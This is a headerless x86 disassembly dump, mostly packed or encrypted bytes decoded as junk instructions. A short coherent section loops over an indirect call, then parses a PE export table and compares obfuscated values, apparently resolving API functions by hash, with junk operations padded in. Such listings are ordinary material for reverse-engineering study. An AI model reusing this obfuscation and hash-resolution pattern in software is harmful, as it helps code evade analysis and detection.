  40f192:	mov    bh,0xf5
  40f194:	out    dx,al
  40f195:	jg     0x40f1d0
  40f197:	dec    ebx
  40f198:	mov    esi,0xe542a48a
  40f19d:	sub    eax,0x36798851
  40f1a2:	retf   
  40f1a3:	sahf   
  40f1a4:	divps  xmm5,XMMWORD PTR ds:0xf3800361
  40f1ab:	shr    BYTE PTR [ecx-0xc],0xf2
  40f1af:	fimul  DWORD PTR [esi+0x77]
  40f1b2:	outs   dx,BYTE PTR ds:[esi]
  40f1b3:	in     al,0xbe
  40f1b5:	sub    DWORD PTR [edi+0x20],edx
  40f1b8:	(bad)  
  40f1b9:	out    0xc7,al
  40f1bb:	mov    edi,0x15a9ac2c
  40f1c0:	pop    ebp
  40f1c1:	addr16 icebp 
  40f1c3:	lods   al,BYTE PTR ds:[esi]
  40f1c4:	icebp  
  40f1c5:	bound  ecx,QWORD PTR [eax+0x34]
  40f1c8:	and    ch,0x10
  40f1cb:	inc    edi
  40f1cc:	or     ch,BYTE PTR [eax-0x4e]
  40f1cf:	sbb    esi,ebx
  40f1d1:	sahf   
  40f1d2:	(bad)  [esi-0x726fdd]
  40f1d8:	popa   
  40f1d9:	dec    esi
  40f1da:	xchg   ebp,eax
  40f1db:	pop    esi
  40f1dc:	cmp    eax,0xb44599b8
  40f1e1:	push   0x4
  40f1e3:	in     al,0xd9
  40f1e5:	inc    esp
  40f1e6:	pop    ebp
  40f1e7:	jmp    0x5620ab21
  40f1ec:	mov    edx,0xcd6a7fb0
  40f1f1:	dec    ebp
  40f1f2:	les    eax,FWORD PTR [eax-0x1d]
  40f1f5:	xchg   edx,eax
  40f1f6:	push   ss
  40f1f7:	ins    DWORD PTR es:[edi],dx
  40f1f8:	in     eax,0x38
  40f1fa:	push   ds
  40f1fb:	push   edi
  40f1fc:	inc    esi
  40f1fd:	movntq QWORD PTR ds:0x746fb704,mm0
  40f204:	lock (bad) 
  40f206:	aad    0x5b
  40f208:	mov    ch,ah
  40f20a:	pusha  
  40f20b:	jo     0x40f276
  40f20d:	and    eax,DWORD PTR es:[edi-0x57]
  40f211:	sbb    ch,bh
  40f213:	stc    
  40f214:	xchg   ecx,eax
  40f215:	jo     0x40f268
  40f217:	scas   al,BYTE PTR es:[edi]
  40f218:	enter  0x6718,0x34
  40f21c:	inc    DWORD PTR [edi+0x5c39db62]
  40f222:	jge    0x40f1da
  40f224:	mov    bh,BYTE PTR [eax+0x645348f3]
  40f22a:	push   es
  40f22b:	(bad)  
  40f22c:	pop    ds
  40f22d:	pop    es
  40f22e:	push   ss
  40f22f:	sub    DWORD PTR [eax-0x5b],ecx
  40f232:	sar    DWORD PTR [edi-0x309839e1],cl
  40f238:	outs   dx,BYTE PTR ds:[esi]
  40f239:	push   0x45
  40f23b:	xchg   edi,eax
  40f23c:	ror    DWORD PTR [esi-0x78],1
  40f23f:	xor    dh,al
  40f241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f242:	or     BYTE PTR [edx],cl
  40f244:	lock mov edi,0x26188360
  40f24a:	arpl   WORD PTR [ebp+0x7a],si
  40f24d:	adc    ebp,DWORD PTR es:[edi-0x438f191c]
  40f254:	mov    dl,0x4f
  40f256:	std    
  40f257:	loopne 0x40f260
  40f259:	jmp    0x40f2bf
  40f25b:	jb     0x40f210
  40f25d:	stos   BYTE PTR es:[edi],al
  40f25e:	fidivr WORD PTR [edx+0x39]
  40f261:	jne    0x40f297
  40f263:	dec    edx
  40f264:	scas   al,BYTE PTR es:[edi]
  40f265:	es cmc 
  40f267:	dec    esi
  40f268:	sbb    al,0x2d
  40f26a:	and    edx,ecx
  40f26c:	scas   al,BYTE PTR es:[edi]
  40f26d:	scas   al,BYTE PTR es:[edi]
  40f26e:	loop   0x40f227
  40f270:	les    ecx,FWORD PTR [ecx+ebx*8+0x60]
  40f274:	std    
  40f275:	jp     0x40f28c
  40f277:	mov    cl,0xcb
  40f279:	loopne 0x40f2ce
  40f27b:	call   0x9d2a:0x8c83f80c
  40f282:	sbb    eax,0xf5305b6f
  40f287:	push   ecx
  40f288:	jmp    FWORD PTR [esi-0x2e4d91e4]
  40f28e:	mov    edi,eax
  40f290:	(bad)  
  40f291:	sub    bh,BYTE PTR [edi]
  40f293:	push   ds
  40f294:	mov    cl,0xa8
  40f296:	mov    WORD PTR [edx+0x5b],?
  40f299:	imul   edx,DWORD PTR [eax],0x27fe4dc5
  40f29f:	jno    0x40f2c9
  40f2a1:	xor    al,0x74
  40f2a3:	cmc    
  40f2a4:	lock es (bad) 
  40f2a8:	mov    dl,0x0
  40f2aa:	fidiv  WORD PTR [edi+0x4402a949]
  40f2b0:	dec    eax
  40f2b1:	ja     0x40f2a2
  40f2b3:	sti    
  40f2b4:	jmp    0x9c6adaaa
  40f2b9:	push   esi
  40f2ba:	into   
  40f2bb:	jbe    0x40f290
  40f2bd:	xor    al,0xd9
  40f2bf:	or     dl,BYTE PTR [esi]
  40f2c1:	enter  0x4219,0xb7
  40f2c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2c6:	and    dh,BYTE PTR [ecx+edi*2-0x26]
  40f2ca:	ja     0x40f2e5
  40f2cc:	aaa    
  40f2cd:	mov    BYTE PTR [esi-0x53e163f4],0xa4
  40f2d4:	push   ds
  40f2d5:	xchg   ebx,eax
  40f2d6:	dec    edi
  40f2d7:	stos   DWORD PTR es:[edi],eax
  40f2d8:	(bad)  
  40f2d9:	fcmovbe st,st(3)
  40f2db:	push   ds
  40f2dc:	inc    ebx
  40f2dd:	stos   DWORD PTR es:[edi],eax
  40f2de:	and    DWORD PTR [esi],edx
  40f2e0:	xchg   esi,eax
  40f2e1:	aad    0x58
  40f2e3:	push   eax
  40f2e4:	xor    eax,0x5a147711
  40f2e9:	mov    eax,ds:0xbc422b5c
  40f2ee:	sub    al,0xea
  40f2f0:	jb     0x40f35e
  40f2f2:	xlat   BYTE PTR ds:[ebx]
  40f2f3:	cmp    dl,ch
  40f2f5:	mov    eax,0x2cf9048e
  40f2fa:	push   0x185c0c3
  40f2ff:	push   esi
  40f300:	push   0x64487ecb
  40f305:	ss iret 
  40f307:	outs   dx,DWORD PTR ds:[esi]
  40f308:	xchg   edx,eax
  40f309:	frndint 
  40f30b:	cmp    al,0x1f
  40f30d:	xchg   esp,eax
  40f30e:	call   0x8c864a4e
  40f313:	mov    al,0x4
  40f315:	aas    
  40f316:	cs pop eax
  40f318:	add    dl,BYTE PTR [esi]
  40f31a:	icebp  
  40f31b:	jle    0x40f2cd
  40f31d:	pop    esi
  40f31e:	mov    WORD PTR [edi+0x614358cc],?
  40f324:	loop   0x40f317
  40f326:	sub    DWORD PTR [esi-0x1ae95cc2],ebp
  40f32c:	cld    
  40f32d:	and    eax,DWORD PTR [edx+0x4524537]
  40f333:	xchg   edi,eax
  40f334:	sub    eax,0xbbfbc4cf
  40f339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f33a:	dec    esp
  40f33b:	add    ch,BYTE PTR [esp+eax*2]
  40f33e:	xor    BYTE PTR [edx-0x3d],dh
  40f341:	xchg   ebp,ebx
  40f343:	pop    edx
  40f344:	cmp    eax,esi
  40f346:	icebp  
  40f347:	jae    0x40f2e4
  40f349:	outs   dx,BYTE PTR ds:[esi]
  40f34a:	clc    
  40f34b:	add    BYTE PTR [ebx+eiz*1],dh
  40f34e:	stc    
  40f34f:	pop    esi
  40f350:	xor    al,0x78
  40f352:	sti    
  40f353:	and    DWORD PTR [esi],edx
  40f355:	xchg   edi,eax
  40f356:	popa   
  40f357:	add    al,0x57
  40f359:	cmp    bl,bl
  40f35b:	repz and ebx,DWORD PTR [edi-0x1a]
  40f35f:	cdq    
  40f360:	pop    ebp
  40f361:	cmp    eax,esp
  40f363:	mov    esi,ecx
  40f365:	mov    bl,bh
  40f367:	xchg   eax,ecx
  40f369:	or     bl,dh
  40f36b:	mov    esi,esi
  40f36d:	adc    DWORD PTR [esi],ebp
  40f36f:	pop    eax
  40f370:	adc    cl,BYTE PTR ds:0xe1b5a63f
  40f376:	xor    eax,0x12352089
  40f37b:	adc    bl,bl
  40f37d:	rol    DWORD PTR [esi+0x38],1
  40f380:	adc    edi,DWORD PTR [esi+eax*4]
  40f383:	shl    eax,0x3d
  40f386:	mov    eax,0x29372429
  40f38b:	mov    dl,0xe7
  40f38d:	retf   0x4f47
  40f390:	mov    WORD PTR [ecx+0x55103379],cs
  40f396:	scas   al,BYTE PTR es:[edi]
  40f397:	xchg   esi,eax
  40f398:	mov    bl,0x7b
  40f39a:	push   esi
  40f39b:	xchg   BYTE PTR [edx+edi*4-0x5336ab29],bl
  40f3a2:	(bad)  
  40f3a3:	xchg   ebp,eax
  40f3a4:	adc    BYTE PTR [ecx+0x18eed496],ch
  40f3aa:	jbe    0x40f374
  40f3ac:	mov    ch,0xc3
  40f3ae:	push   cs
  40f3af:	push   edx
  40f3b0:	(bad)  
  40f3b1:	fldenv [edi]
  40f3b3:	pop    esi
  40f3b4:	loop   0x40f3ec
  40f3b6:	mov    ebx,0x504d2737
  40f3bb:	dec    esp
  40f3bc:	adc    eax,0xc6942c5d
  40f3c1:	xor    esi,DWORD PTR [edi]
  40f3c3:	xor    eax,0x108135ad
  40f3c8:	out    0x3d,eax
  40f3ca:	jne    0x40f3ce
  40f3cc:	and    al,0x3
  40f3ce:	imul   edx,ecx,0xb47fe463
  40f3d4:	jg     0x40f3c5
  40f3d6:	jb     0x40f433
  40f3d8:	pushf  
  40f3d9:	test   eax,0x54d63d9a
  40f3de:	sub    esi,DWORD PTR [esi+0x63]
  40f3e1:	repz dec edx
  40f3e3:	or     al,0x0
  40f3e5:	or     eax,0x19852072
  40f3ea:	lds    edx,FWORD PTR [ecx]
  40f3ec:	mov    ds:0x2939a5bf,eax
  40f3f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3f2:	sub    esp,0xaf561af
  40f3f8:	stc    
  40f3f9:	sbb    dl,BYTE PTR [esi-0x4f57a2c8]
  40f3ff:	mov    ds:0x6fd1a0be,al
  40f404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f405:	xor    BYTE PTR [ecx+0x5],0x78
  40f409:	les    eax,FWORD PTR [ebx+edx*8]
  40f40c:	std    
  40f40d:	nop
  40f40e:	push   ecx
  40f40f:	push   ebp
  40f410:	int    0x11
  40f412:	retf   0x9333
  40f415:	int3   
  40f416:	sbb    DWORD PTR [ebx+ecx*1-0x57],0xffffffc4
  40f41b:	inc    esp
  40f41c:	mov    ah,0x18
  40f41e:	leave  
  40f41f:	adc    ch,al
  40f421:	(bad)  
  40f422:	mov    esi,DWORD PTR [ebp+0x5ae545db]
  40f428:	sti    
  40f429:	scas   eax,DWORD PTR es:[edi]
  40f42a:	mov    al,ds:0x82c39993
  40f42f:	sub    DWORD PTR [ecx+0xe288290],ecx
  40f435:	inc    ecx
  40f436:	sbb    dl,BYTE PTR [edi+0x44]
  40f439:	and    eax,0x453eef81
  40f43e:	sbb    edx,eax
  40f440:	scas   al,BYTE PTR es:[edi]
  40f441:	cmp    DWORD PTR [edx-0x2b8760e5],ebp
  40f447:	mov    ebx,0x421a58cc
  40f44c:	pop    esi
  40f44d:	push   cs
  40f44e:	add    DWORD PTR [edx],edx
  40f450:	add    DWORD PTR [ecx],ecx
  40f452:	mov    eax,0x66a43ceb
  40f457:	scas   eax,DWORD PTR es:[edi]
  40f458:	mov    esp,0x3895e30f
  40f45d:	xlat   BYTE PTR ds:[ebx]
  40f45e:	icebp  
  40f45f:	jmp    0x4be281
  40f464:	xchg   edi,eax
  40f465:	loope  0x40f451
  40f467:	aad    0x2f
  40f469:	inc    ebp
  40f46a:	cwde   
  40f46b:	xor    BYTE PTR [ecx],dh
  40f46d:	fwait
  40f46e:	xor    DWORD PTR [esp+eiz*2],ebp
  40f471:	mov    edi,0x305fe7c0
  40f476:	dec    eax
  40f477:	xchg   ecx,eax
  40f478:	jae    0x40f408
  40f47a:	sub    eax,0xbb8698b1
  40f47f:	sub    DWORD PTR [edx-0x15181807],esi
  40f485:	ret    0x412c
  40f488:	es push 0x44
  40f48b:	cmp    eax,0x899f34dc
  40f490:	inc    ebp
  40f491:	in     al,dx
  40f492:	mov    DWORD PTR ds:0x42a2aa,0x1f
  40f49c:	cmp    DWORD PTR ds:0x42a2aa,0x0
  40f4a3:	je     0x40f4e0
  40f4a9:	cmp    DWORD PTR ds:0x42a2aa,0x2b
  40f4b0:	jg     0x40f4e0
  40f4b6:	jmp    0x40f4ce
  40f4bb:	push   DWORD PTR [ebp-0x20]
  40f4be:	push   0x68ce
  40f4c3:	push   0x13fc
  40f4c8:	call   DWORD PTR ds:0x42a40e
  40f4ce:	mov    ecx,DWORD PTR ds:0x42a2aa
  40f4d4:	dec    ecx
  40f4d5:	mov    DWORD PTR ds:0x42a2aa,ecx
  40f4db:	jmp    0x40f49c
  40f4e0:	mov    eax,DWORD PTR [ebp-0x4]
  40f4e3:	mov    ecx,DWORD PTR ds:0x42a2ea
  40f4e9:	adc    ecx,DWORD PTR ds:0x42a2fe
  40f4ef:	mov    DWORD PTR ds:0x42a2ea,ecx
  40f4f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f4f8:	sub    DWORD PTR ds:0x42a256,0x42a2c6
  40f502:	xor    eax,esi
  40f504:	xor    DWORD PTR ds:0x42a27a,0x42a276
  40f50e:	add    eax,edi
  40f510:	mov    DWORD PTR ds:0x42a26a,0x50b9
  40f51a:	cmp    ecx,eax
  40f51c:	je     0x413d1d
  40f522:	xor    ecx,DWORD PTR ds:0x42a2ee
  40f528:	mov    eax,DWORD PTR [ebp-0x14]
  40f52b:	xor    ecx,0x6e1c
  40f531:	mov    eax,DWORD PTR [eax+0x18]
  40f534:	mov    DWORD PTR [ebp-0x24],eax
  40f537:	mov    eax,DWORD PTR [ebp-0x14]
  40f53a:	xor    ecx,ecx
  40f53c:	or     ecx,DWORD PTR ds:0x42a29e
  40f542:	xor    DWORD PTR ds:0x42a2aa,ecx
  40f548:	mov    ecx,DWORD PTR [ebp+0x8]
  40f54b:	xor    DWORD PTR ds:0x42a2e6,0x42a2f6
  40f555:	add    ecx,DWORD PTR [eax+0x20]
  40f558:	mov    DWORD PTR [ebp-0x2c],ecx
  40f55b:	mov    eax,ds:0x42a2d6
  40f560:	and    DWORD PTR ds:0x42a29e,eax
  40f566:	mov    eax,DWORD PTR [ebp-0x14]
  40f569:	mov    ecx,DWORD PTR [ebp+0x8]
  40f56c:	adc    DWORD PTR ds:0x42a2c2,0xc51
  40f576:	add    ecx,DWORD PTR [eax+0x24]
  40f579:	xor    DWORD PTR ds:0x42a28a,0x42a29e
  40f583:	mov    DWORD PTR [ebp-0x34],ecx
  40f586:	mov    eax,DWORD PTR [ebp-0x14]
  40f589:	mov    ecx,DWORD PTR [ebp+0x8]
  40f58c:	add    ecx,DWORD PTR [eax+0x1c]
  40f58f:	mov    DWORD PTR [ebp-0x14],ecx
  40f592:	jmp    0x411969
  40f597:	mov    eax,DWORD PTR [ebp-0x2c]
  40f59a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f59d:	add    ecx,DWORD PTR [eax+ebx*4]
  40f5a0:	mov    DWORD PTR [ebp-0x28],ecx
  40f5a3:	mov    eax,DWORD PTR [ebp-0x4]
  40f5a6:	mov    ecx,DWORD PTR [ebp-0x28]
  40f5a9:	xor    eax,esi
  40f5ab:	add    eax,edi
  40f5ad:	cmp    ecx,eax
  40f5af:	je     0x411969
  40f5b5:	jmp    0x41195a
  40f5ba:	mov    eax,DWORD PTR [ebp-0x4]
  40f5bd:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5c0:	xor    eax,esi
  40f5c2:	add    eax,edi
  40f5c4:	cmp    ecx,eax
  40f5c6:	mov    eax,DWORD PTR [ebp-0x4]
  40f5c9:	je     0x413d20
  40f5cf:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5d2:	xor    eax,esi
  40f5d4:	add    eax,edi
  40f5d6:	cmp    ecx,eax
  40f5d8:	je     0x413d29
  40f5de:	jmp    0x41195a
  40f5e3:	or     al,BYTE PTR es:[edx-0x17]
  40f5e7:	inc    edx
  40f5e8:	mov    eax,ds:0x1d8d8286
  40f5ed:	ins    DWORD PTR es:[edi],dx
  40f5ee:	mov    al,ds:0x78fd5f24
  40f5f3:	jno    0x40f59d
  40f5f5:	add    DWORD PTR [ebx-0x7c7ca1de],0xffffff98
  40f5fc:	mov    dh,0xa8
  40f5fe:	int3   
  40f5ff:	or     ch,BYTE PTR [ebx-0x549feca5]
  40f605:	push   ss
  40f606:	mov    esi,0x89d5e989
  40f60b:	jmp    0xe12450f4
  40f610:	outs   dx,DWORD PTR ds:[esi]
  40f611:	mov    esp,0x6df467a1
  40f616:	call   0x7248b168
  40f61b:	sub    cl,BYTE PTR [eax-0x45]
  40f61e:	repnz mov cl,0xce
  40f621:	hlt    
  40f622:	ins    DWORD PTR es:[edi],dx
  40f623:	xchg   dh,bh
  40f625:	push   esp
  40f626:	sub    DWORD PTR [ebx],edi
  40f628:	mov    dh,0xe1
  40f62a:	mov    ds:0x73e173f4,al
  40f62f:	sbb    BYTE PTR [eax+0x59],ah
  40f632:	stos   DWORD PTR es:[edi],eax
  40f633:	mov    WORD PTR [ebp+ecx*8+0x6b],fs
  40f637:	pop    ecx
  40f638:	add    DWORD PTR [eax-0x1c],ebp
  40f63b:	mov    al,ds:0x6af9c2e6
  40f640:	out    0xa4,al
  40f642:	inc    eax
  40f643:	test   DWORD PTR [edx+0x66],ecx
  40f646:	dec    ebp
  40f647:	pop    esi
  40f648:	sub    DWORD PTR [ebx],eax
  40f64a:	or     esp,DWORD PTR [edi]
  40f64c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f64d:	cmc    
  40f64e:	cmp    ebp,edx
  40f650:	cmp    ecx,ecx
  40f652:	inc    ebx
  40f653:	jle    0x40f6be
  40f655:	outs   dx,BYTE PTR ds:[esi]
  40f656:	or     BYTE PTR [ebp+0x62e1c521],cl
  40f65c:	ss push eax
  40f65e:	imul   edx,DWORD PTR [eax+0x238bbbe4],0xffffffd9
  40f665:	ror    cl,1
  40f667:	popf   
  40f668:	ins    DWORD PTR es:[edi],dx
  40f669:	xor    DWORD PTR [ebp-0x3f],esi
  40f66c:	xor    BYTE PTR [eax+0x35f055c9],cl
  40f672:	pop    ebp
  40f673:	jmp    0xf794:0x6a99e9a5
  40f67a:	out    dx,eax
  40f67b:	mov    al,0x4
  40f67d:	push   es
  40f67e:	sbb    eax,0x180ef46a
  40f683:	std    
  40f684:	rol    ah,cl
  40f686:	add    edi,esi
  40f688:	adc    eax,0x87fa03d1
  40f68d:	push   ecx
  40f68e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f68f:	jmp    0x6b92:0x6ccc8297
  40f696:	and    ebx,ecx
  40f698:	cmp    DWORD PTR [ecx-0x9],ebx
  40f69b:	lds    eax,FWORD PTR [ecx]
  40f69d:	(bad)  
  40f69e:	xchg   esi,eax
  40f69f:	mov    dl,0x38
  40f6a1:	inc    ebp
  40f6a2:	lds    ecx,FWORD PTR [edi]
  40f6a4:	cmp    eax,0x6528afbb
  40f6a9:	fnsave [edx]
  40f6ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6ac:	inc    esi
  40f6ad:	mov    al,ds:0x94e05bdd
  40f6b2:	cmp    al,0x7c
  40f6b4:	xchg   ebp,eax
  40f6b5:	arpl   WORD PTR [edi],ax
  40f6b7:	fs push 0x3c0f3407
  40f6bd:	adc    edx,DWORD PTR [ebp-0x56]
  40f6c0:	loopne 0x40f701
  40f6c2:	(bad)  
  40f6c3:	sub    BYTE PTR [edx-0x461bb2d8],ah
  40f6c9:	in     al,dx
  40f6ca:	call   0x8790:0x454f0a93
  40f6d1:	int    0x64
  40f6d3:	pusha  
  40f6d4:	or     BYTE PTR [edx-0x26],dl
  40f6d7:	push   ds
  40f6d8:	mov    esp,0x9293eb06
  40f6dd:	sbb    al,0xc8
  40f6df:	xor    bl,BYTE PTR [ebx-0x3256f608]
  40f6e5:	shl    DWORD PTR [esi+0x36320c40],0xb0
  40f6ec:	sub    eax,0x4da0cf0b
  40f6f1:	retf   0xa8d
  40f6f4:	dec    edi
  40f6f5:	add    eax,0x22227104
  40f6fa:	xlat   BYTE PTR ds:[ebx]
  40f6fb:	xchg   edx,eax
  40f6fc:	xchg   esi,eax
  40f6fd:	pop    edx
  40f6fe:	mov    cl,0x1
  40f700:	iret   
  40f701:	mov    ch,0x6d
  40f703:	sbb    ebp,edx
  40f705:	cmp    eax,0xa71de3ae
  40f70a:	adc    al,0x1
  40f70c:	mov    ebp,0x15b535b0
  40f711:	dec    edx
  40f712:	or     al,0xf3
  40f714:	scas   eax,DWORD PTR es:[edi]
  40f715:	dec    eax
  40f716:	idiv   DWORD PTR [edx]
  40f718:	fs pop eax
  40f71a:	xchg   edi,eax
  40f71b:	dec    edx
  40f71c:	mov    ah,0xb3
  40f71e:	aas    
  40f71f:	popf   
  40f720:	push   0x54
  40f722:	loopne 0x40f783
  40f724:	fimul  DWORD PTR [ecx-0x1]
  40f727:	lock pop ds
  40f729:	push   edi
  40f72a:	push   edi
  40f72b:	aam    0x2d
  40f72d:	lods   al,BYTE PTR ds:[esi]
  40f72e:	jmp    0xa3dd:0x453bfca3
  40f735:	bound  esi,QWORD PTR [edx]
  40f737:	adc    edx,DWORD PTR [edi-0x58718d1a]
  40f73d:	jb     0x40f6fc
  40f73f:	push   esi
  40f740:	aam    0x75
  40f742:	jg     0x40f754
  40f744:	pusha  
  40f745:	call   0x3bd2354c
  40f74a:	sbb    edi,0x890268da
  40f750:	mov    ecx,0x5bd6a0c2
  40f755:	lods   al,BYTE PTR ds:[esi]
  40f756:	icebp  
  40f757:	inc    esp
  40f758:	jb     0x40f7c9
  40f75a:	lea    eax,[ebp+0x16]
  40f75d:	cmp    eax,0xe889dfd3
  40f762:	cdq    
  40f763:	mov    ebp,0xc607a11b
  40f768:	(bad)  
  40f769:	in     eax,0x6b
  40f76b:	mov    eax,0xb4b7374d
  40f770:	xlat   BYTE PTR ds:[ebx]
  40f771:	cmp    ch,dl
  40f773:	imul   esi,DWORD PTR [edx+0x3],0x78662cbf
  40f77a:	sbb    eax,0xf5e16d4f
  40f77f:	fabs   
  40f781:	push   ecx
  40f782:	imul   esi,DWORD PTR [esi],0xefbae312
  40f788:	sbb    eax,0x10f39d02
  40f78d:	mov    ah,0x36
  40f78f:	imul   ebx,eax,0xe0b2a51c
  40f795:	pop    ss
  40f796:	dec    ebx
  40f797:	add    DWORD PTR [ebx+ebx*8+0x55],esp
  40f79b:	sbb    bh,0xc3
  40f79e:	ss mov eax,0xb42baacf
  40f7a4:	push   ds
  40f7a5:	test   DWORD PTR [edi],ecx
  40f7a7:	std    
  40f7a8:	fimul  WORD PTR [edx]
  40f7aa:	jo     0x40f7b4
  40f7ac:	pop    ebp
  40f7ad:	dec    esi
  40f7ae:	mov    ecx,edi
  40f7b0:	stc    
  40f7b1:	int    0xba
  40f7b3:	retf   0x4f86
  40f7b6:	(bad)  
  40f7b8:	jp     0x40f781
  40f7ba:	outs   dx,BYTE PTR ds:[esi]
  40f7bb:	adc    dl,dh
  40f7bd:	outs   dx,BYTE PTR ds:[esi]
  40f7be:	pop    ss
  40f7bf:	mov    eax,ds:0x4908602f
  40f7c4:	adc    eax,0xf094eecd
  40f7c9:	inc    edx
  40f7ca:	mov    ecx,DWORD PTR [ebx+0x11]
  40f7cd:	outs   dx,DWORD PTR ds:[esi]
  40f7ce:	(bad)  
  40f7d0:	cmp    edx,ecx
  40f7d2:	xchg   edx,eax
  40f7d3:	ja     0x40f79f
  40f7d5:	(bad)  
  40f7d7:	iret   
  40f7d8:	(bad)  
  40f7d9:	cmp    al,0x65
  40f7db:	adc    BYTE PTR [ebx+eiz*1-0x57a6a207],al
  40f7e2:	fsubr  DWORD PTR [ebp-0x48]
  40f7e5:	dec    ebp
  40f7e6:	cmp    eax,0x3596ae34
  40f7eb:	fldenv [edx+0x66]
  40f7ee:	sti    
  40f7ef:	add    edx,DWORD PTR [edi-0xb208c49]
  40f7f5:	sub    al,0x39
  40f7f7:	cmp    edx,DWORD PTR [edx-0x6e21e0b1]
  40f7fd:	sub    al,0xf4
  40f7ff:	pop    ecx
  40f800:	mov    ss,WORD PTR ds:0xfd37
  40f805:	push   0xffffffd3
  40f807:	fild   DWORD PTR [ecx+eax*8-0x14]
  40f80b:	aas    
  40f80c:	int3   
  40f80d:	push   ss
  40f80e:	(bad)  
  40f80f:	dec    bh
  40f811:	push   es
  40f812:	ds cmp al,0x17
  40f815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f816:	dec    edx
  40f817:	adc    DWORD PTR ds:0xfbe3666d,ecx
  40f81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f81e:	adc    BYTE PTR [eax],bh
  40f820:	mov    ch,0x2f
  40f822:	or     DWORD PTR [eax-0x745f2920],0x6893e4e4
  40f82c:	push   ecx
  40f82d:	inc    edx
  40f82e:	sub    ch,0x11
  40f831:	in     eax,0x5
  40f833:	(bad)  
  40f834:	popf   
  40f835:	outs   dx,DWORD PTR ds:[esi]
  40f836:	jmp    0x96b07d2d
  40f83b:	pop    eax
  40f83c:	sub    DWORD PTR [esp+esi*4],0x1f9ecb52
  40f843:	mov    ebx,0xeeebba96
  40f848:	cld    
  40f849:	jl     0x40f883
  40f84b:	lods   al,BYTE PTR ds:[esi]
  40f84c:	add    eax,0x2089e375
  40f851:	inc    edx
  40f852:	outs   dx,DWORD PTR ds:[esi]
  40f853:	int3   
  40f854:	jbe    0x40f85f
  40f856:	loop   0x40f852
  40f858:	in     eax,0xb0
  40f85a:	std    
  40f85b:	js     0x40f876
  40f85d:	jle    0x40f8a5
  40f85f:	adc    bh,BYTE PTR [edx-0x6d190ada]
  40f865:	adc    ebx,DWORD PTR [edx-0x4b02ac06]
  40f86b:	jl     0x40f862
  40f86d:	jp     0x40f8ba
  40f86f:	add    eax,0x78345e3
  40f874:	cld    
  40f875:	mov    BYTE PTR [eax-0xd],ah
  40f878:	lahf   
  40f879:	dec    eax
  40f87a:	out    0x85,al
  40f87c:	sbb    eax,0x96a6358b
  40f881:	push   0xc165de29
  40f886:	inc    esp
  40f887:	pop    ecx
  40f888:	mov    dl,0x98
  40f88a:	inc    ebp
  40f88b:	jnp    0x40f8bc
  40f88d:	icebp  
  40f88e:	cmc    
  40f88f:	leave  
  40f890:	out    dx,al
  40f891:	and    cl,bh
  40f893:	dec    edx
  40f894:	pop    edi
  40f895:	and    DWORD PTR [ebp+0x7d3916ad],ebx
  40f89b:	sbb    dl,BYTE PTR [ebx]
  40f89d:	fmulp  st(4),st
  40f89f:	jb     0x40f8dd
  40f8a1:	adc    BYTE PTR [ebp+0x1c],dh
  40f8a4:	test   esp,esi
  40f8a6:	sub    BYTE PTR ds:[eax],0x56
  40f8aa:	or     dl,BYTE PTR [eax]
  40f8ac:	inc    edi
  40f8ad:	fimul  DWORD PTR [ebx]
  40f8af:	jp     0x40f833
  40f8b1:	pop    ebx
  40f8b2:	sahf   
  40f8b3:	ins    DWORD PTR es:[edi],dx
  40f8b4:	adc    esi,DWORD PTR [ecx]
  40f8b6:	inc    edx
  40f8b7:	cli    
  40f8b8:	sbb    BYTE PTR [edx],bh
  40f8ba:	clc    
  40f8bb:	pop    ds
  40f8bc:	sti    
  40f8bd:	shl    esp,1
  40f8bf:	and    BYTE PTR [ebx+0x5fabe2fc],dh
  40f8c5:	(bad)  
  40f8c6:	mul    DWORD PTR [ecx+ecx*2+0x642a4063]
  40f8cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ce:	cmc    
  40f8cf:	add    BYTE PTR [ebx+0x78],cl
  40f8d2:	jns    0x40f85a
  40f8d4:	enter  0x25a1,0xd3
  40f8d8:	repnz mov dh,0x38
  40f8db:	addr16 xchg edx,eax
  40f8dd:	push   ss
  40f8de:	jne    0x40f8b9
  40f8e0:	xchg   BYTE PTR [eax],al
  40f8e2:	or     eax,0x2fb15dc1
  40f8e7:	dec    esi
  40f8e8:	push   edx
  40f8e9:	sahf   
  40f8ea:	lock sub BYTE PTR [edx+0x5e],cl
  40f8ee:	mov    edx,0xe4bf4093
  40f8f3:	mov    ebx,0x1b1f8df7
  40f8f8:	mov    ch,0x9
  40f8fa:	les    eax,FWORD PTR [esi]
  40f8fc:	je     0x40f8fb
  40f8fe:	cmp    BYTE PTR [ebp+0x44e8d9df],ch
  40f904:	out    0xdd,al
  40f906:	cld    
  40f907:	outs   dx,BYTE PTR ds:[esi]
  40f908:	jb     0x40f8d4
  40f90a:	ja     0x40f924
  40f90c:	pop    ecx
  40f90d:	lods   al,BYTE PTR ds:[esi]
  40f90e:	(bad)  
  40f90f:	into   
  40f910:	push   es
  40f911:	out    dx,eax
  40f912:	retf   0xc45b
  40f915:	or     eax,0xa827b27
  40f91a:	push   es
  40f91b:	in     al,0x8b
  40f91d:	into   
  40f91e:	and    eax,0x5cc8b387
  40f923:	call   0x303b3146
  40f928:	mov    al,ds:0xa2b1a15
  40f92d:	sub    edx,ebp
  40f92f:	aad    0x2e
  40f931:	shl    BYTE PTR ds:0x1d1c8f9,cl
  40f937:	mov    DWORD PTR ds:0xa4f1c99c,esp
  40f93d:	js     0x40f996
  40f93f:	dec    edx
  40f940:	ret    
  40f941:	in     al,dx
  40f942:	adc    cl,al
  40f944:	adc    al,0xf0
  40f946:	mov    dh,0x97
  40f948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f949:	push   ebx
  40f94a:	rcr    cl,cl
  40f94c:	in     eax,dx
